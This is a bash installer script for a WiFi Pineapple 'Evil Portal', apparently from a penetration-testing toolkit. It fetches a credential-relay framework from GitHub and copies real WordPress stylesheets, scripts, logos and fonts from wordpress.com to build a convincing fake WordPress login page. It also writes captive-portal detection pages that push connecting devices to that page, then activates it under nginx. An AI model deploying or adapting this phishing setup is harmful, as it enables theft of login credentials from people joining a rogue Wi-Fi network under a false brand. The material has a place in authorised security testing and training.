#!/bin/bash
# Name: WordPress Portal
# Description: Downloads and activates the WordPress captive portal template
# Author: PentestPlaybook
# Version: 1.2
# Category: Evil Portal

# ====================================================================
# Configuration - Auto-detect Portal IP
# ====================================================================
if ip addr show br-evil 2>/dev/null | grep -q "10.0.0.1"; then
    PORTAL_IP="10.0.0.1"
else
    PORTAL_IP="172.16.52.1"
fi

LOG "Detected Portal IP: ${PORTAL_IP}"
REPO_URL="https://github.com/PentestPlaybook/auth-relay-framework/archive/refs/heads/main.tar.gz"
REPO_DIR="/root/auth-relay-framework"
PORTAL_DIR="/root/portals/Wordpress"

# ====================================================================
# STEP 0: Backwards Compatibility Check
# ====================================================================
LOG "Step 0: Checking for backwards compatibility..."

if [ -d "/root/portals/Wordpress" ] && [ ! -d "/root/portals/Default" ]; then
    LOG "Detected legacy installation: Wordpress exists but Default does not"
    LOG "Renaming /root/portals/Wordpress to /root/portals/Default..."
    mv /root/portals/Wordpress /root/portals/Default
    LOG "SUCCESS: Legacy portal backed up to Default"
fi

# ====================================================================
# STEP 1: Download Repository
# ====================================================================
LOG "Step 1: Downloading auth-relay-framework repository..."

cd /root
rm -rf auth-relay-framework auth-relay-framework-main auth-relay-framework.tar.gz

wget "${REPO_URL}" -O auth-relay-framework.tar.gz
if [ $? -ne 0 ]; then
    LOG "ERROR: Failed to download repository"
    exit 1
fi

tar -xzf auth-relay-framework.tar.gz
mv auth-relay-framework-main auth-relay-framework
rm auth-relay-framework.tar.gz

LOG "SUCCESS: Repository downloaded"

# ====================================================================
# STEP 2: Create Wordpress Portal Directory
# ====================================================================
LOG "Step 2: Setting up Wordpress portal directory..."

mkdir -p "${PORTAL_DIR}/images"
mkdir -p "${PORTAL_DIR}/wp-includes/fonts"

# Copy PHP/HTML files from repo
cp ${REPO_DIR}/wordpress/captive-portal/setup/pineapple/web-root/* "${PORTAL_DIR}/"

LOG "SUCCESS: Portal files copied"

# ====================================================================
# STEP 3: Download WordPress Static Assets
# ====================================================================
LOG "Step 3: Downloading WordPress static assets..."

cd "${PORTAL_DIR}"

# CSS and JS
wget -q "https://wordpress.com/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,buttons,forms,l10n,login&ver=6.8.2" -O wp-login.css
wget -q "https://wordpress.com/wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=clipboard,jquery-core,jquery-migrate,zxcvbn-async,wp-hooks&ver=6.8.2" -O wp-scripts.js

# Images
wget -q "https://wordpress.com/wp-admin/images/wordpress-logo.svg" -O images/wordpress-logo.svg
wget -q "https://wordpress.com/wp-admin/images/w-logo-blue.png" -O images/w-logo-blue.png

# Fonts
wget -q "https://wordpress.com/wp-includes/fonts/dashicons.woff2" -O wp-includes/fonts/dashicons.woff2
wget -q "https://wordpress.com/wp-includes/fonts/dashicons.ttf" -O wp-includes/fonts/dashicons.ttf
wget -q "https://wordpress.com/wp-includes/fonts/dashicons.eot" -O wp-includes/fonts/dashicons.eot

LOG "SUCCESS: Static assets downloaded"

# ====================================================================
# STEP 4: Create Captive Portal Detection Files
# ====================================================================
LOG "Step 4: Creating captive portal detection files..."

cat > "${PORTAL_DIR}/generate_204.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/">
    <script>window.location.href="http://${PORTAL_IP}/";</script>
</head>
<body>
    <a href="http://${PORTAL_IP}/">Sign in to network</a>
</body>
</html>
EOF

cat > "${PORTAL_DIR}/hotspot-detect.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://${PORTAL_IP}/">
    <script>window.location.href="http://${PORTAL_IP}/";</script>
</head>
<body>
    <a href="http://${PORTAL_IP}/">Sign in to network</a>
</body>
</html>
EOF

LOG "SUCCESS: Detection files created"

# ====================================================================
# STEP 5: Activate Portal via Symlinks
# ====================================================================
LOG "Step 5: Activating Wordpress portal via symlinks..."

# Clear /www
rm -rf /www/*

# Create symlinks for PHP files
ln -sf "${PORTAL_DIR}/index.php" /www/index.php
ln -sf "${PORTAL_DIR}/MyPortal.php" /www/MyPortal.php
ln -sf "${PORTAL_DIR}/helper.php" /www/helper.php

# Create symlinks for captive portal detection
ln -sf "${PORTAL_DIR}/generate_204.html" /www/generate_204
ln -sf "${PORTAL_DIR}/hotspot-detect.html" /www/hotspot-detect.html

# Create symlinks for static assets
ln -sf "${PORTAL_DIR}/wp-login.css" /www/wp-login.css
ln -sf "${PORTAL_DIR}/wp-scripts.js" /www/wp-scripts.js
ln -sf "${PORTAL_DIR}/images" /www/images
ln -sf "${PORTAL_DIR}/wp-includes" /www/wp-includes

# Restore captiveportal symlink
ln -sf /pineapple/ui/modules/evilportal/assets/api /www/captiveportal

LOG "SUCCESS: Portal activated via symlinks"

# ====================================================================
# STEP 6: Restart nginx
# ====================================================================
LOG "Step 6: Restarting nginx..."

nginx -t
if [ $? -ne 0 ]; then
    LOG "ERROR: nginx configuration test failed"
    exit 1
fi

/etc/init.d/nginx restart

LOG "SUCCESS: nginx restarted"

# ====================================================================
# Verification
# ====================================================================
LOG "Step 7: Verifying installation..."

if curl -s http://${PORTAL_IP}/ | grep -q "WordPress"; then
    LOG "SUCCESS: Wordpress portal is responding"
else
    LOG "WARNING: Portal may not be responding correctly"
fi

LOG "=================================================="
LOG "Wordpress Portal Activated!"
LOG "=================================================="
LOG "Portal URL: http://${PORTAL_IP}/"
LOG "Portal files: ${PORTAL_DIR}/"
LOG "Active via symlinks in: /www/"
LOG ""
LOG "To switch back to Default portal:"
LOG "  Run the 'Activate Default Portal' payload"
LOG "=================================================="

exit 0
